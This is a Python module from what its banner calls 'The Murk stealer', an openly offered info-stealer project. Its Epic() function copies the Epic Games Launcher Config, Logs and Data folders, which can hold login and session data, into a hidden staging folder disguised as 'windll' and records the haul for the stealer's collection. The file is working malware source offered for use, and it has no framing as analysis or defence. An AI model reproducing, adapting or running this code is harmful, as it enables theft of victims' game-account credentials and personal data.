#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import environ,sep
from shutil import copytree
from manager.logger import Log

path = r'EpicGamesLauncher\Saved\Config'
path1 = r'EpicGamesLauncher\Saved\Logs'
path2 = r'EpicGamesLauncher\Saved\Data'


def Epic(data):
    try:
        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
        user = environ['USERPROFILE'] + sep + r'AppData\Local'
        copytree(user+ sep + path,rf'{pathtofile}\windll\Games\EpicGames\Config')
        copytree(user+ sep + path1,rf'{pathtofile}\windll\Games\EpicGames\Logs')
        copytree(user+ sep + path2,rf'{pathtofile}\windll\Games\EpicGames\Data')
        data.append("\n∟🎮EpicGames")
        return data
    except Exception as error:
        Log(f"EpicGames ---> {error}")
        return data